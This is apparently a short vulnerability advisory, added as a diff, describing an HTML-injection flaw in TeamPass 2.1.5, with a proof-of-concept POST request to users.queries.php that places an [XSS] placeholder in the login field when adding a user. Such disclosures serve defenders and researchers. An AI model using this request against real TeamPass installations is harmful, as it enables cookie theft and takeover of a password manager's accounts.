@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/53038/info
+
+TeamPass is prone to an HTML-injection vulnerability because it fails to sanitize user-supplied input.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and control how the site is rendered to the user; other attacks are also possible.
+
+TeamPass 2.1.5 is vulnerable; other versions may also be affected.
+
+POST /TeamPass/sources/users.queries.php HTTP/1.1
+type=add_new_user&login=[XSS]&pw=testing2&email=test&admin=false&manager=true&read_only=false&personal_folder=false&new_folder_role_domain=false&domain=test&key=key 
